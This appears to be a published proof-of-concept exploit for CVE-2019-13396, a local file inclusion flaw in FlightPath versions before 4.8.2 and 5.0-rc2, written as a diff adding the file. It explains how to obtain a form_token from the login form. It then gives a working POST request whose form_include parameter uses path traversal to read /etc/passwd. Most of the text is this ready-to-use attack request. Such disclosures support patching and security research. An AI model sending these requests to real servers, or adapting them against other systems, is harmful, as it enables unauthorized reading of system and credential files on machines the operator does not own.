@@ -1,0 +1,33 @@
+# Exploit Title: FlightPath < 4.8.2 & < 5.0-rc2 - Local File Inclusion
+# Date: 07-07-2019
+# Exploit Author: Mohammed Althibyani
+# Vendor Homepage: http://getflightpath.com
+# Software Link: http://getflightpath.com/project/9/releases
+# Version: < 4.8.2 & < 5.0-rc2
+# Tested on: Kali Linux
+# CVE : CVE-2019-13396
+
+
+# Parameters : include_form
+# POST Method:
+
+use the login form to get right form_token [ you can use wrong user/pass ]
+
+This is how to POST looks like:
+
+POST /flightpath/index.php?q=system-handle-form-submit HTTP/1.1
+
+callback=system_login_form&form_token=fb7c9d22c839e3fb5fa93fe383b30c9b&form_type=&form_path=login&form_params=YTowOnt9&form_include=&default_redirect_path=login&default_redirect_query=current_student_id%3D%26advising_student_id%3D&current_student_id=&user=test&password=test&btn_submit=Login
+
+
+# modfiy the POST request to be:
+
+
+POST /flightpath/index.php?q=system-handle-form-submit HTTP/1.1
+
+callback=system_login_form&form_token=fb7c9d22c839e3fb5fa93fe383b30c9b&form_include=../../../../../../../../../etc/passwd
+
+
+
+
+# Greats To : Ryan Saaty, Mohammed Al-Howsa & Haboob Team.
